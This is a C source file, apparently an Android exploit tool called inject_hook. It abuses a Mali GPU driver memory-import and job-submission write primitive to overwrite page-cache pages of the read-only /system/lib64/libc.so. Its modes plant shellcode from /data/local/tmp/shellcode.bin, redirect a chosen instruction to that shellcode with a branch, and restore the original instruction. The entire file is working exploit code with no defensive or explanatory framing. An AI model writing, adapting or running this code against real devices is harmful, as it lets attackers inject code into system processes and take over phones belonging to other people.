#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdlib.h>
#include <sched.h>

/* Generalized page-cache patcher for libc.so, built on the Mali import CPU-map
 * write primitive (patch_page).  Modes:
 *   inject_hook place   <sc_off> <placeholder>   place shellcode.bin at sc_off
 *   inject_hook hook    <target> <sc_off>        branch target -> sc_off
 *   inject_hook restore <target> <orig_insn>     write original insn at target
 * All offsets are absolute file offsets in /system/lib64/libc.so (hex ok).
 */

#define BASE_MEM_PROT_CPU_RD (1<<0)
#define BASE_MEM_PROT_CPU_WR (1<<1)
#define BASE_MEM_PROT_GPU_RD (1<<2)
#define BASE_MEM_IMPORT_TYPE_USER_BUFFER 3
#define BASE_MEM_MAP_TRACKING_HANDLE (3ull << 12)
#define BASE_JD_REQ_EXTERNAL_RESOURCES (1<<8)
#define BASE_JD_REQ_SOFT_JOB (1<<9)
#define BASE_JD_REQ_SOFT_EVENT_WAIT (BASE_JD_REQ_SOFT_JOB | 0x5)

struct kbase_ioctl_version_check { uint16_t major, minor; };
struct kbase_ioctl_set_flags { uint32_t create_flags; };
struct base_jd_udata { uint64_t blob[2]; };
struct base_dependency { uint8_t atom_id; uint8_t dependency_type; };
struct base_jd_atom_v2 {
    uint64_t jc; struct base_jd_udata udata; uint64_t extres_list;
    uint16_t nr_extres; uint16_t compat_core_req; struct base_dependency pre_dep[2];
    uint8_t atom_number; uint8_t prio; uint8_t device_nr; uint8_t padding[1]; uint32_t core_req;
};
struct base_external_resource { uint64_t ext_resource; };
struct kbase_ioctl_job_submit { uint64_t addr; uint32_t nr_atoms; uint32_t stride; };
struct base_mem_import_user_buffer { uint64_t ptr; uint64_t length; };
union kbase_ioctl_mem_import {
    struct { uint64_t flags; uint64_t phandle; uint32_t type; uint32_t padding; uint64_t header_page_number; } in;
    struct { uint64_t flags; uint64_t gpu_va; uint64_t va_pages; } out;
};
union kbase_ioctl_mem_alloc {
    struct { uint64_t va_pages; uint64_t commit_pages; uint64_t extent; uint64_t flags; } in;
    struct { uint64_t flags; uint64_t gpu_va; } out;
};

static void init_mali(int fd) {
    struct kbase_ioctl_version_check ver = {11, 16};
    if (ioctl(fd, _IOWR(0x80,0,struct kbase_ioctl_version_check), &ver) < 0) { perror("version"); exit(1); }
    struct kbase_ioctl_set_flags sf = {0};
    if (ioctl(fd, _IOW(0x80,1,struct kbase_ioctl_set_flags), &sf) < 0) { perror("set_flags"); exit(1); }
    mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);
}
static void* map_gpu(int fd, unsigned va, unsigned commit) {
    union kbase_ioctl_mem_alloc a; memset(&a, 0, sizeof(a));
    a.in.flags = BASE_MEM_PROT_CPU_RD|BASE_MEM_PROT_GPU_RD|BASE_MEM_PROT_CPU_WR|(1<<3) | (1u<<22);
    a.in.va_pages = va; a.in.commit_pages = commit;
    if (ioctl(fd, _IOWR(0x80,5,union kbase_ioctl_mem_alloc), &a) < 0) { perror("mem_alloc"); exit(1); }
    void* r = mmap(NULL, 0x1000*va, PROT_READ|PROT_WRITE, MAP_SHARED, fd, a.out.gpu_va);
    if (r == MAP_FAILED) { perror("mmap map_gpu"); exit(1); }
    return r;
}
static void job(int fd, uint8_t an, uint32_t core_req, uint64_t jc, uint64_t extres) {
    struct base_external_resource er = { .ext_resource = extres };
    struct base_jd_atom_v2 atom; memset(&atom, 0, sizeof(atom));
    atom.atom_number = an; atom.core_req = core_req;
    atom.extres_list = (uint64_t)(uintptr_t)&er; atom.nr_extres = 1; atom.jc = jc;
    struct kbase_ioctl_job_submit s = {0};
    s.addr = (uint64_t)(uintptr_t)&atom; s.nr_atoms = 1; s.stride = sizeof(struct base_jd_atom_v2);
    if (ioctl(fd, _IOW(0x80,2,struct kbase_ioctl_job_submit), &s) < 0) { perror("job_submit"); exit(1); }
}
static int patch_page(int fd, const char* path, uint64_t page_off, const uint8_t* newpage) {
    void* X = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memset(X, 0, 0x1000);
    struct base_mem_import_user_buffer ubi = { (uint64_t)(uintptr_t)X, 0x1000 };
    union kbase_ioctl_mem_import mi; memset(&mi, 0, sizeof(mi));
    mi.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_RD | (1u<<12);
    mi.in.phandle = (uint64_t)(uintptr_t)&ubi; mi.in.type = BASE_MEM_IMPORT_TYPE_USER_BUFFER;
    if (ioctl(fd, _IOWR(0x80,22,union kbase_ioctl_mem_import), &mi) < 0) { perror("import"); return -1; }
    void* cmap = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, mi.out.gpu_va);
    if (cmap == MAP_FAILED) { perror("cpu mmap"); return -1; }
    munmap(X, 0x1000);
    int f = open(path, O_RDONLY);
    if (f < 0) { perror("open target"); return -1; }
    void* ro = mmap(X, 0x1000, PROT_READ, MAP_PRIVATE|MAP_FIXED, f, page_off);
    if (ro != X) { printf("mmap_fixed failed\n"); return -1; }
    void* jc = map_gpu(fd, 1, 1);
    job(fd, 0, BASE_JD_REQ_EXTERNAL_RESOURCES|BASE_JD_REQ_SOFT_EVENT_WAIT, (uint64_t)(uintptr_t)jc, (uint64_t)(uintptr_t)cmap);
    memcpy(cmap, newpage, 0x1000);
    __builtin___clear_cache((char*)cmap, (char*)cmap + 0x1000);
    close(f);
    return 0;
}

static uint64_t hx(const char* s) { return strtoull(s, NULL, 16); }

int main(int argc, char** argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc < 3) { printf("usage: inject_hook place <sc_off> <ph> | hook <target> <sc_off> | restore <target> <insn>\n"); return 1; }
    const char* cmd = argv[1];
    const char* path = "/system/lib64/libc.so";
    cpu_set_t cset; CPU_ZERO(&cset); CPU_SET(0, &cset);
    sched_setaffinity(0, sizeof(cset), &cset);
    int fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) { perror("open mali"); return 1; }
    init_mali(fd);

    if (!strcmp(cmd, "place")) {
        uint64_t sc_off = hx(argv[2]);
        uint32_t ph = argc > 3 ? (uint32_t)hx(argv[3]) : 0;
        FILE* fp = fopen("/data/local/tmp/shellcode.bin", "rb");
        if (!fp) { perror("open shellcode.bin"); return 1; }
        uint8_t sc[4096]; size_t sc_len = fread(sc, 1, sizeof(sc), fp);
        fclose(fp);
        uint32_t back = 0x14000000 | (((int64_t)(hx(argv[4]) - (sc_off + ph)) >> 2) & 0x3ffffff);
        memcpy(sc + ph, &back, 4);
        printf("[+] shellcode %zu bytes, branch-back=0x%08x (-> 0x%llx)\n", sc_len, back, (unsigned long long)hx(argv[4]));
        uint8_t pagebuf[4096];
        int f = open(path, O_RDONLY);
        pread(f, pagebuf, sizeof(pagebuf), sc_off & ~0xfffULL);
        memcpy(pagebuf + (sc_off & 0xfff), sc, sc_len);
        close(f);
        if (patch_page(fd, path, sc_off & ~0xfffULL, pagebuf)) return 1;
        printf("[+] SHELLCODE PLACED @0x%llx\n", (unsigned long long)sc_off);
    } else if (!strcmp(cmd, "hook")) {
        uint64_t target = hx(argv[2]);
        uint64_t sc_off = hx(argv[3]);
        uint8_t bpage[4096];
        int f = open(path, O_RDONLY);
        pread(f, bpage, sizeof(bpage), target & ~0xfffULL);
        close(f);
        uint32_t insn = 0x14000000 | (((int64_t)(sc_off - target) >> 2) & 0x3ffffff);
        memcpy(bpage + (target & 0xfff), &insn, 4);
        if (patch_page(fd, path, target & ~0xfffULL, bpage)) return 1;
        printf("[+] HOOKED 0x%llx -> 0x%llx (b=0x%08x)\n", (unsigned long long)target, (unsigned long long)sc_off, insn);
    } else if (!strcmp(cmd, "restore")) {
        uint64_t target = hx(argv[2]);
        uint32_t orig = (uint32_t)hx(argv[3]);
        uint8_t bpage[4096];
        int f = open(path, O_RDONLY);
        pread(f, bpage, sizeof(bpage), target & ~0xfffULL);
        close(f);
        memcpy(bpage + (target & 0xfff), &orig, 4);
        if (patch_page(fd, path, target & ~0xfffULL, bpage)) return 1;
        printf("[+] RESTORED 0x%llx = 0x%08x\n", (unsigned long long)target, orig);
    } else { printf("unknown cmd %s\n", cmd); return 1; }
    return 0;
}
